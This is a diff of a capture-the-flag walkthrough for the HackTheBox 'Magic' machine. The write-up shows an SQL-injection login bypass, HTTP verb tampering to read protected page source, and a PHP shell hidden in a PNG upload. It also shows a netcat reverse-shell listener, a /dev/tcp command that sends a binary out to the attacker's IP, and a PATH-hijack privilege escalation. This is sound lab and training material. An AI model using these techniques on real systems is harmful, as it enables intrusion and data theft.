@@ -81,27 +81,39 @@ Starting nikto scan
 Finished nikto scan
 ```
 
-[https://www.sans.org/blog/http-verb-tampering-in-asp-net/](https://www.sans.org/blog/http-verb-tampering-in-asp-net/)
-
-### HTTP Verb Tampering
-
-Tested for simple sql injection and was logged in! or found upload.php with dirbuster, and using verb tampering \(as identified by nikto\) was able to get the source code of the page.
-
-![DEBUG HTTP Method](../../.gitbook/assets/3-debug-method.png)
-
-This can also be done against this server by sending arbitrary methods as such:
-
-![&quot;TEST&quot; HTTP Method](../../.gitbook/assets/3.5-test-method.png)
-
-I also noticed you can find the URL to the upload page in the home page's source
+While testing various things, I found multiple ways forward for this next section.   First, I found the URL to an upload page at `/upload.php` with dirbuster, and I also noticed you can find the URL to the upload page in the home page's source.
 
 ![](../../.gitbook/assets/1.5-image-upload.png)
 
-Whatever method used to get the upload page: 
+### HTTP Verb Tampering
+
+Once I had the URL, I was able to use Burp and use a bypass method called verb tampering. Nikto pointed this out by identifying that the DEBUG method was able to be used on this server.  
+
+```text
+DEBUG HTTP verb may show server debugging information.
+```
+
+According to a post on the SANS website [https://www.sans.org/blog/http-verb-tampering-in-asp-net/](https://www.sans.org/blog/http-verb-tampering-in-asp-net/), a vulnerability called HTTP Verb tampering can be used to enumerate the source of pages that are supposed to be behind access control methods.  This can be done by sending HTTP methods the server does not understand and is caused by a misconfiguration of the server.
+
+![DEBUG HTTP Method](../../.gitbook/assets/3-debug-method.png)
+
+First I requested the `/upload.php` page normally, then captured the request in Burp and sent it to the Repeater tool.  The normal request tried to redirect me to the login page.  From here I changed the HTTP method to DEBUG to see what it would give me.
+
+![&quot;TEST&quot; HTTP Method](../../.gitbook/assets/3.5-test-method.png)
+
+Using the method DEBUG I was given the source of the `/upload.php` page!  This can also be done against this server by sending arbitrary method names as such `TEST`:
+
+![&quot;TEST&quot; HTTP Method](../../.gitbook/assets/3.5-test-method.png)
+
+{% hint style="info" %}
+There is a link to login at the bottom left of the home page which leads to the standard admin login page. While checking for for simple SQL injection I put my test command **`'or'a'='a`** in the password field and was logged right in! 
+{% endhint %}
+
+Whatever method used, it leads to the upload page where there is a simple drag & drop file uploader: 
 
 ![](../../.gitbook/assets/3-magic-upload.png)
 
-from here I was able to craft an image upload with a png file header and php code in it and send it using Burp Repeater. I got this idea a while back from watching one of Ippsec's videos [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s)
+After getting access to the upload page, I crafted an fake image upload with a PNG file header and PHP code in it and send it using Burp Repeater. I got this idea a while back from watching Ippsec's videos on [HackTheBox - Vault](https://www.youtube.com/watch?v=LfbwlPxToBc&t=519s).
 
 [https://www.php.net/manual/en/function.passthru.php](https://www.php.net/manual/en/function.passthru.php) [https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru](https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru)
 
@@ -167,7 +179,7 @@ to get burp to catch the request I had to go into the settings and disable the d
 ![](../../.gitbook/assets/4-disable-image-filter.png)
 
 ```python
-zweilos@kalimaa:~/Downloads$ nc -lvnp 8099
+zweilos@kali:~/Downloads$ nc -lvnp 8099
 listening on [any] 8099 ...
 connect to [10.10.15.57] from (UNKNOWN) [10.10.10.185] 48146
 /bin/sh: 0: can't access tty; job control turned off
@@ -296,7 +308,7 @@ tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      
 There is a `mysql` service user, port 3306 is open...seems like MySQL is running! NExt I tried to find the executable files related to it to see how to get into the database.
 
 ```text
-www-data@ubuntu:/var/www/Magic/images/uploads$find / -name mysql* -executable 2>/dev/null
+www-data@ubuntu:/var/www/Magic/images/uploads$ find / -name mysql* -executable 2>/dev/null
 /usr/sbin/mysqld
 /usr/share/php7.4-mysql/mysql
 /usr/share/doc/mysql-server
@@ -525,27 +537,7 @@ H/W path           Device      Class      Description
 /0/28                          memory     System Memory
 /0/28/0                        memory     4GiB DIMM DRAM EDO
 ...snipped...  
-/0/100                         bridge     440BX/ZX/DX - 82443BX/ZX/DX Host bridge
-/0/100/1                       bridge     440BX/ZX/DX - 82443BX/ZX/DX AGP bridge
-/0/100/7                       bridge     82371AB/EB/MB PIIX4 ISA
-/0/100/7.1                     storage    82371AB/EB/MB PIIX4 IDE
-/0/100/7.3                     bridge     82371AB/EB/MB PIIX4 ACPI
-/0/100/7.7                     generic    Virtual Machine Communication Interface
-/0/100/f                       display    SVGA II Adapter
-/0/100/10          scsi2       storage    53c1030 PCI-X Fusion-MPT Dual Ultra320 SCSI
-/0/100/10/0.0.0    /dev/sda    disk       21GB Virtual disk
-/0/100/10/0.0.0/1  /dev/sda1   volume     19GiB EXT4 volume
-/0/100/11                      bridge     PCI bridge
-/0/100/11/0                    bus        USB1.1 UHCI Controller
-/0/100/11/0/1      usb2        bus        UHCI Host Controller
-/0/100/11/0/1/1                input      VMware Virtual USB Mouse
-/0/100/11/0/1/2                bus        VMware Virtual USB Hub
-/0/100/11/1                    bus        USB2 EHCI Controller
-/0/100/11/1/1      usb1        bus        EHCI Host Controller
-/0/100/15                      bridge     PCI Express Root Port
-/0/100/15/0        ens160      network    VMXNET3 Ethernet Controller
-...snipped...
-/0/46              scsi0       storage    
+
 /0/46/0.0.0        /dev/cdrom  disk       VMware IDE CDR00
 /1                             system     
 
@@ -568,54 +560,8 @@ vendor_id       : AuthenticAMD
 cpu family      : 23
 model           : 1
 model name      : AMD EPYC 7401P 24-Core Processor
-stepping        : 2
-microcode       : 0x8001230
-cpu MHz         : 1999.999
-cache size      : 512 KB
-physical id     : 0
-siblings        : 1
-core id         : 0
-cpu cores       : 1
-apicid          : 0
-initial apicid  : 0
-fpu             : yes
-fpu_exception   : yes
-cpuid level     : 13
-wp              : yes
-flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
-bugs            : fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypass
-bogomips        : 3999.99
-TLB size        : 2560 4K pages
-clflush size    : 64
-cache_alignment : 64
-address sizes   : 43 bits physical, 48 bits virtual
-power management:
+...snipped...
 
-processor       : 1
-vendor_id       : AuthenticAMD
-cpu family      : 23
-model           : 1
-model name      : AMD EPYC 7401P 24-Core Processor
-stepping        : 2
-microcode       : 0x8001230
-cpu MHz         : 1999.999
-cache size      : 512 KB
-physical id     : 2
-siblings        : 1
-core id         : 0
-cpu cores       : 1
-apicid          : 2
-initial apicid  : 2
-fpu             : yes
-fpu_exception   : yes
-cpuid level     : 13
-wp              : yes
-flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx mmxext fxsr_opt pdpe1gb rdtscp lm constant_tsc rep_good nopl tsc_reliable nonstop_tsc cpuid extd_apicid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm extapic cr8_legacy abm sse4a misalignsse 3dnowprefetch osvw ssbd ibpb vmmcall fsgsbase bmi1 avx2 smep bmi2 rdseed adx smap clflushopt sha_ni xsaveopt xsavec xsaves clzero arat overflow_recov succor
-bugs            : fxsave_leak sysret_ss_attrs null_seg spectre_v1 spectre_v2 spec_store_bypass
-bogomips        : 3999.99
-TLB size        : 2560 4K pages
-clflush size    : 64
-cache_alignment : 64
 address sizes   : 43 bits physical, 48 bits virtual
 power management:
 
@@ -665,9 +611,9 @@ hint: you can use the Bing in-search calculator to convert between the two measu
 
 I decided to exfiltrate the `sysinfo` program see how it worked. `theseus@ubuntu:/dev/shm$ cat /bin/sysinfo > /dev/tcp/10.10.15.57/8099`
 
-![](https://github.com/zweilosec/htb-writeups/tree/170533f9dba99f709ee55644e711b316c9739dad/linux-machines/medium/ghidra_pic)
+![](../../.gitbook/assets/10-free-ghidra.png)
 
-By examining the program sysinfo in `ghidra` I could see that it called multiple other programs, similar to a bash script. The problem with this program was that it called these external programs only by name, and did not use the full absolute paths. This can allow a malicious attacker \(or even a freindly neighborhood security researcher!\) to create their own program in a folder that exists in the PATH earlier than the real one \(or one could simply prepend a folder of their choosing to the PATH environment variable!\)
+By examining the program sysinfo in `ghidra` I could see that it called multiple other programs, similar to a bash script. The problem with this program was that it called these external programs only by name, and did not use the full absolute paths. This can allow a malicious attacker \(or even a friendly neighborhood security researcher!\) to create their own program in a folder that exists in the PATH earlier than the real one \(or one could simply prepend a folder of their choosing to the PATH environment variable!\)
 
 `lshw, fdisk, free, cat /proc/cpuinfo`
 
